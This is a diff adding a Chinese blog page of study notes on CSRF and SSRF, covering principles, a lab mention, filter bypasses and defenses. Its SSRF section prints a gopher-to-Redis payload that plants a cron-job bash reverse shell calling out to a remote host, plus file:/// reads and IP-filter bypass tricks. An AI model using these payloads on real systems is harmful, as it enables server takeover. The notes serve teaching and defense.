@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/favicon/apple-touch-icon.png?v=2.8.0" sizes="180x180"><meta name="description" content="CSRF       ​		CSRF(跨站请求伪造)，攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作）。因为浏览器之前认证过、所以被访问的站点会认为这是真正的用户操作而去运行。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF-SSRF">
+<meta property="og:url" content="https://www.ixxzhi.cn/2023/08/20/CSRF-SSRF/index.html">
+<meta property="og:site_name" content="冰糖の部落阁">
+<meta property="og:description" content="CSRF       ​		CSRF(跨站请求伪造)，攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作）。因为浏览器之前认证过、所以被访问的站点会认为这是真正的用户操作而去运行。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://qiniu2.ixxzhi.cn/image-20230414214705644.png">
+<meta property="article:published_time" content="2023-08-19T16:01:56.000Z">
+<meta property="article:modified_time" content="2023-09-04T08:06:51.978Z">
+<meta property="article:author" content="冰糖小混子">
+<meta property="article:tag" content="常见Web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://qiniu2.ixxzhi.cn/image-20230414214705644.png"><title>CSRF-SSRF | 冰糖の部落阁</title><link ref="canonical" href="https://www.ixxzhi.cn/2023/08/20/CSRF-SSRF/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: {"appId":"AKOK4JB6FU","apiKey":"afe2853f80920ee4cdb1d45209c0ecf2","indexName":"blog_ixxzhi","hits":{"per_page":10},"languages":{"inputPlaceholder":"搜索文章","hitsEmpty":"没有找到任何搜索结果：${query}","hitsStats":"找到 ${hits} 条搜索结果，耗时 ${time} 毫秒"}},
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">冰糖の部落阁</div><div class="header-banner-info__subtitle">冰糖的笔记和随笔</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CSRF-SSRF</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-04</span></span></div></header><div class="post-body">
+        <h1 id="CSRF"   >
+          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
+      <p>​		CSRF(跨站请求伪造)，攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作）。因为浏览器之前认证过、所以被访问的站点会认为这是真正的用户操作而去运行。</p>
+<span id="more"></span>
+
+
+        <h2 id="原理"   >
+          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h2>
+      <p><img src="http://qiniu2.ixxzhi.cn/image-20230414214705644.png" alt="image-20230414214705644"></p>
+
+        <h2 id="条件"   >
+          <a href="#条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#条件" class="headerlink" title="条件"></a>条件</h2>
+      <ul>
+<li>用户已经登录了网站，具有执行各个功能的权限。</li>
+<li>攻击者知道功能的数据包。</li>
+<li>用户访问了攻击者构造的恶意URL。</li>
+</ul>
+
+        <h2 id="利用"   >
+          <a href="#利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用" class="headerlink" title="利用"></a>利用</h2>
+      <p>pikachu靶场</p>
+<blockquote>
+<p>看到可以修改个人信息</p>
+</blockquote>
+
+        <h2 id="防御"   >
+          <a href="#防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御" class="headerlink" title="防御"></a>防御</h2>
+      <ol>
+<li>当用户修改密码时需要输入原密码</li>
+<li>检验referer来源，验证是否为管理员本人在操作</li>
+<li><strong>设置随机token验证</strong></li>
+<li>设置验证码</li>
+<li>http头中自定义属性并验证</li>
+</ol>
+
+        <h1 id="SSRF"   >
+          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
+      <p>服务端请求伪造是指一种由攻击者造成服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标都是从外网访问的内部系统，借助服务端发起伪造的请求、可以访问到与它相连而与外网隔离的内部系统。</p>
+
+        <h2 id="原理-1"   >
+          <a href="#原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2>
+      <p>由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。</p>
+
+        <h2 id="思路"   >
+          <a href="#思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路" class="headerlink" title="思路"></a>思路</h2>
+      <ul>
+<li><p>web功能上查找</p>
+<ol>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务：通过URL地址把原地址的网页内容调优使其更适合手机屏幕浏览</li>
+<li>在线翻译：通过URL地址翻译对应文本的内容</li>
+<li>图片加载和下载：通过URL地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+</ol>
+</li>
+<li><p>从URL关键字中寻找</p>
+<blockquote>
+<p>share wapurl link src source target u 3g display sourceURL imageURL domain等</p>
+</blockquote>
+</li>
+</ul>
+
+        <h2 id="利用-1"   >
+          <a href="#利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2>
+      <ul>
+<li>端口扫描</li>
+<li>内网探测</li>
+<li>漏洞利用</li>
+<li>文件读取等</li>
+</ul>
+
+        <h3 id="加载其他东西"   >
+          <a href="#加载其他东西" class="heading-link"><i class="fas fa-link"></i></a><a href="#加载其他东西" class="headerlink" title="加载其他东西"></a>加载其他东西</h3>
+      <p>?url&#x3D;<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://xxx.xx.xx/" >http://xxx.xx.xx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="扫描端口"   >
+          <a href="#扫描端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3>
+      <p>?url&#x3D;<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://172.168.10.11:8000/" >http://172.168.10.11:8000/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="协议利用"   >
+          <a href="#协议利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h3>
+      <p><strong>文件读取：</strong>file:&#x2F;&#x2F;&#x2F;c:&#x2F;aaa&#x2F;bb.txt</p>
+<p><strong>gopher协议攻击内网（条件苛刻）</strong></p>
+<p>gopher协议在ssrf的利用中一般用来攻击redis，mysql，fastcgi，smtp等服务</p>
+<p><strong>格式：</strong></p>
+<p>gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流</p>
+<p><strong>注意</strong></p>
+<ul>
+<li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li>
+<li>数据流末尾使用%0d%0a代表消息结束</li>
+</ul>
+<p>gopher攻击redis</p>
+<ul>
+<li><p>redis数据流格式：</p>
+<blockquote>
+<p>*&lt;参数数量&gt; CR LF</p>
+<p>$&lt;参数1的字节数量&gt; CR LF</p>
+<p>&lt;参数1的数据&gt; CR LF</p>
+<p>…</p>
+<p>$&lt;参数N的字节数量&gt; CR LF</p>
+<p>&lt;参数N的数据&gt; CR LF</p>
+</blockquote>
+</li>
+<li><p>简单示例</p>
+<ul>
+<li>*4：表示4个参数config、set、dir、&#x2F;var&#x2F;www&#x2F;html</li>
+<li>$6：表示每个参数的字节长度config长度为6</li>
+</ul>
+<blockquote>
+<p>*4</p>
+<p>$6</p>
+<p>config</p>
+<p>$3</p>
+<p>set</p>
+<p>$3</p>
+<p>dir</p>
+<p>$13</p>
+<p>&#x2F;var&#x2F;www&#x2F;html</p>
+</blockquote>
+</li>
+<li><p>写入redis计划任务</p>
+<blockquote>
+<p>set ttt “\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xx&#x2F;1444 0&gt;&amp;1\n\n\n\n”<br>config set dir &#x2F;var&#x2F;spool&#x2F;cron<br>config set dbfilename root<br>save<br>quite</p>
+</blockquote>
+</li>
+<li><p>gopher协议数据流</p>
+<blockquote>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_<em>3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%<br>0a%0a</em>&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xx&#x2F;1444<br>0&gt;&amp;1%0a%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0<br>d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a<br>$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%<br>0d%0aquit%0d%0a</p>
+</blockquote>
+</li>
+<li><p>payload</p>
+<blockquote>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%<br>74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%74%74%74%25%30%64%25%30%61%24%36%39%25%30%64%25%30%61%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%34%2e%32%32%31%2e%38%31%2e%32%35%32%2f%31%34%34%34%20%30%3e%26%31%25%30%61%25%30%61%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%71%75%69%74%25%30%64%25%30%61</p>
+</blockquote>
+</li>
+<li><p>查看写入的key</p>
+<blockquote>
+<p>url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;keys *</p>
+</blockquote>
+</li>
+<li><p>查看是否写入成功</p>
+<blockquote>
+<p>url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;get ttt</p>
+</blockquote>
+</li>
+</ul>
+
+        <h2 id="SSRF绕过"   >
+          <a href="#SSRF绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2>
+      <ul>
+<li><p>添加端口</p>
+<blockquote>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1等价于http//127.0.0.1:80" >http://127.0.0.1等价于http://127.0.0.1:80</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>https端口 443</p>
+</blockquote>
+<p>过滤时用 <code>.</code> 号分割，127.0.0.1分割为：（127，0，0，1:80），最后一个不是数字，就可以绕过IP地址的限制。</p>
+</li>
+<li><p>短网址</p>
+<p>把过滤的域名生成短网址。来进行绕过，过滤了某些域名的情况。</p>
+</li>
+<li><p>数值绕过</p>
+<blockquote>
+<p>IP地址时32位二进制数据组成</p>
+<p>目前看到的IP地址都是采用点分十进制宝石：如127.0.0.1、172.168.0.1</p>
+<p>127.0.0.1 01111111.00000000.00000000.00000001<br>转换成十进制：2130706433浏览器会自动解析成127.0.0.1<br>八进制：0177.00.00.01<br>十六进制：0x7f.0x0.0x0.0x1</p>
+</blockquote>
+</li>
+<li><p>跳转绕过，加@可以跳转到指定的URL</p>
+<blockquote>
+<p><a href="http://www.baidu.com@127.0.0.1会跳转到127.0.0.1">http://www.baidu.com@127.0.0.1会跳转到127.0.0.1</a></p>
+</blockquote>
+</li>
+<li><p>等价替换</p>
+<blockquote>
+<p>127.0.0.1可以用localhost或::来替换</p>
+<p>127。0。0。1  &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+</li>
+<li><p>利用302跳转</p>
+<blockquote>
+<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://xip.io/" >http://xip.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p>
+</blockquote>
+</li>
+</ul>
+
+        <h2 id="SSRF防御"   >
+          <a href="#SSRF防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h2>
+      <ol>
+<li>过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li>
+<li>统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态</li>
+<li>限制请求的端口，比如80、443、8080、8090.</li>
+<li>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题</li>
+<li>使用DNS缓存或者HOST白名单的方式。</li>
+</ol>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://www.ixxzhi.cn">冰糖小混子</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://www.ixxzhi.cn/2023/08/20/CSRF-SSRF/">https://www.ixxzhi.cn/2023/08/20/CSRF-SSRF/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/">常见Web漏洞</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/20/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">代码执行漏洞</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">XSS漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="utterances-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">
+          CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">
+          条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">
+          利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">
+          防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">2.</span> <span class="toc-text">
+          SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">
+          思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.3.</span> <span class="toc-text">
+          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B6%E4%BB%96%E4%B8%9C%E8%A5%BF"><span class="toc-number">2.3.1.</span> <span class="toc-text">
+          加载其他东西</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.2.</span> <span class="toc-text">
+          扫描端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.3.</span> <span class="toc-text">
+          协议利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">
+          SSRF绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">2.5.</span> <span class="toc-text">
+          SSRF防御</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/avatar.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">冰糖小混子</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">31</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">23</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>冰糖小混子</span><span class="footer__devider">|</span><span><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">蒙ICP备20002846号</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"></div><div class="search-results"><div id="algolia-hits"></div></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', function () {
+  $('.header-nav-search').on('click', function (e) {
+    e.stopPropagation();
+
+    $('body').css('overflow', 'hidden');
+    $('.search-popup')
+      .velocity('stop')
+      .velocity('transition.expandIn', {
+        duration: 300,
+        complete: function () {
+          $('.search-popup input').focus();
+        }
+      });
+    $('.search-mask')
+      .velocity('stop')
+      .velocity('transition.fadeIn', {
+        duration: 300
+      });
+  });
+
+  function closeSearch () {
+    $('body').css({ overflow: 'auto' });
+    $('.search-popup').css({ display: 'none' });
+    $('.search-mask').css({ display: 'none' });
+  }
+
+  $('.search-mask, .search-close').on('click', function () {
+    closeSearch();
+  });
+
+  $(document).on('keydown', function (e) {
+    // Escape <=> 27
+    if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+      closeSearch();
+    }
+  });
+
+  var algolia = CONFIG.algolia;
+  if (!algolia && !(algolia.appId && algolia.apiKey && algolia.indexName)) {
+    return console.error('Algolia setting is invalid.');
+  }
+
+  var search = instantsearch({
+    appId: algolia.appId,
+    apiKey: algolia.apiKey,
+    indexName: algolia.indexName,
+    searchParameters: {
+      hitsPerPage: algolia.hits.per_page || 10
+    },
+    searchFunction: function (helper) {
+      var searchInput = $('.search-input').find('input');
+
+      if (searchInput.val()) {
+        helper.search();
+      }
+    }
+  });
+
+  search.addWidget(
+    instantsearch.widgets.searchBox({
+      container: '.search-input',
+      reset: false,
+      magnifier: false,
+      placeholder: algolia.languages.inputPlaceholder
+    })
+  );
+
+  // The hits of search results.
+  search.addWidget(
+    instantsearch.widgets.hits({
+      container: '#algolia-hits',
+      templates: {
+        item: function (data) {
+          var link = data.permalink ? data.permalink : CONFIG.root + data.path;
+          return (
+            '<a href="' + link + '" class="algolia-hit-item-link">' +
+              data._highlightResult.title.value +
+            '</a>'
+          );
+        },
+        empty: function (data) {
+          return (
+            '<div id="algolia-hits-empty">' +
+              algolia.languages.hitsEmpty.replace(/\$\{query}/, data.query) +
+            '</div>'
+          );
+        }
+      },
+      cssClasses: {
+        item: 'algolia-hit-item'
+      }
+    })
+  );
+
+  // The stats of search results.
+  if ($('#algolia-stats')[0]) {
+    search.addWidget(
+      instantsearch.widgets.stats({
+        container: '#algolia-stats',
+        templates: {
+          body: function (data) {
+            var stats = algolia.languages.hitsStats
+              .replace(/\$\{hits}/, data.nbHits)
+              .replace(/\$\{time}/, data.processingTimeMS);
+            return (
+              stats +
+              '<span class="algolia-logo pull-right">' +
+                '<img src="' + CONFIG.root +
+                `${CONFIG.sourcePath.images}/algolia.svg" alt="Algolia" />` +
+              '</span>'
+            );
+          }
+        }
+      })
+    );
+  }
+
+  // The pagination of the results.
+  search.addWidget(
+    instantsearch.widgets.pagination({
+      container: '#algolia-pagination',
+      scrollTo: false,
+      showFirstLast: false,
+      labels: {
+        first: '<i class="fa fa-angle-double-left"></i>',
+        last: '<i class="fa fa-angle-double-right"></i>',
+        previous: '<i class="fa fa-angle-left"></i>',
+        next: '<i class="fa fa-angle-right"></i>'
+      },
+      cssClasses: {
+        root: 'pagination',
+        item: 'pagination-item',
+        link: 'page-number',
+        active: 'current',
+        disabled: 'disabled-item'
+      }
+    })
+  );
+
+  search.start();
+});</script><script>function loadUtterances() {
+  var d = document, s = d.createElement('script');
+  var container = d.getElementById('utterances-container');
+
+  if (!container) {
+    return;
+  }
+  s.src = 'https://utteranc.es/client.js';
+  s.setAttribute('repo', 'ixxzhi/ixxzhi.github.io');
+  s.setAttribute('issue-term', 'title');
+  s.setAttribute('label', 'utterances');
+  s.setAttribute('theme', 'github-light');
+  s.setAttribute('crossorigin', 'anonymous');
+  s.setAttribute('async', '');
+  if (false) {
+    s.setAttribute('data-pjax-rm', '');
+  }
+  container.append(s);
+}
+
+if (false) {
+  loadUtterances();
+} else {
+  window.addEventListener('DOMContentLoaded', loadUtterances, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
